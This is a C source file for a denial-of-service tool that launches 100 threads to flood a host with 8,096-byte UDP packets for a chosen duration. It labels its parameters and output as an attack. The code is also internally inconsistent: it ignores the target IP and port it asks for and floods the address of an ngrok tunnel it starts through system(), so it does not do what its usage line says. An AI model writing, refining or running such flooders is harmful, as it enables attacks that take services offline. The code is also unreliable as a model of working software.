#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <curl/curl.h>
#include <jansson.h>
#include <time.h>

#define MAX_THREADS 100
#define PAYLOAD_SIZE 8096
#define NGROK_API_URL "http://localhost:4040/api/tunnels"

typedef struct {
    char ip[64];
    int port;
    int duration;
} AttackParams;

size_t write_callback(void *contents, size_t size, size_t nmemb, char *output) {
    size_t total_size = size * nmemb;
    strncat(output, (char*)contents, total_size);
    return total_size;
}

void start_ngrok() {
    system("./ngrok tcp 0 &");  // Start a single ngrok TCP tunnel
    sleep(5);  // Wait for ngrok to start
}

int get_ngrok_tunnel(AttackParams *params) {
    CURL *curl;
    CURLcode res;
    char response[8192] = {0};
    long http_code = 0;

    curl = curl_easy_init();
    if (!curl) {
        fprintf(stderr, "Failed to initialize curl\n");
        return -1;
    }

    curl_easy_setopt(curl, CURLOPT_URL, NGROK_API_URL);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, response);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 5);
    res = curl_easy_perform(curl);
    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);
    curl_easy_cleanup(curl);

    if (res != CURLE_OK || http_code != 200) {
        fprintf(stderr, "Failed to get ngrok tunnel info\n");
        return -1;
    }

    json_t *root, *tunnels_array, *tunnel, *public_url;
    json_error_t error;
    root = json_loads(response, 0, &error);
    if (!root) {
        fprintf(stderr, "JSON parsing error\n");
        return -1;
    }

    tunnels_array = json_object_get(root, "tunnels");
    if (!json_is_array(tunnels_array) || json_array_size(tunnels_array) == 0) {
        fprintf(stderr, "No active tunnels found\n");
        json_decref(root);
        return -1;
    }

    tunnel = json_array_get(tunnels_array, 0);  // Get the first (only) tunnel
    public_url = json_object_get(tunnel, "public_url");

    if (json_is_string(public_url)) {
        char url[256];
        strncpy(url, json_string_value(public_url), sizeof(url) - 1);
        sscanf(url, "tcp://%[^:]:%d", params->ip, &params->port);
        printf("Ngrok Tunnel -> %s:%d\n", params->ip, params->port);
    }

    json_decref(root);
    return 0;
}

void* send_payload(void* arg) {
    AttackParams* params = (AttackParams*)arg;
    int sock;
    struct sockaddr_in server_addr;
    char payload[PAYLOAD_SIZE];

    memset(payload, 'A', PAYLOAD_SIZE - 1);
    payload[PAYLOAD_SIZE - 1] = '\0';

    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(params->port);
    server_addr.sin_addr.s_addr = inet_addr(params->ip);

    printf("Routing traffic through %s:%d for %d seconds...\n", params->ip, params->port, params->duration);

    time_t start_time = time(NULL);
    while (time(NULL) - start_time < params->duration) {
        if (sendto(sock, payload, PAYLOAD_SIZE, 0, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
            perror("Send failed");
            break;
        }
        usleep(10000);
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char* argv[]) {
    if (argc != 4) {
        printf("Usage: %s <TARGET_IP> <TARGET_PORT> <DURATION>\n", argv[0]);
        return 1;
    }

    int duration = atoi(argv[3]);

    printf("Starting ngrok (Free Plan - 1 Tunnel)...\n");
    start_ngrok();

    AttackParams params;
    params.duration = duration;

    if (get_ngrok_tunnel(&params) != 0) {
        printf("Failed to retrieve ngrok tunnel\n");
        return 1;
    }

    pthread_t threads[MAX_THREADS];

    printf("Sending traffic for %d seconds...\n", duration);

    for (int i = 0; i < MAX_THREADS; i++) {
        if (pthread_create(&threads[i], NULL, send_payload, &params) != 0) {
            perror("Thread creation failed");
        }
    }

    for (int i = 0; i < MAX_THREADS; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("Attack finished after %d seconds.\n", duration);
    return 0;
}
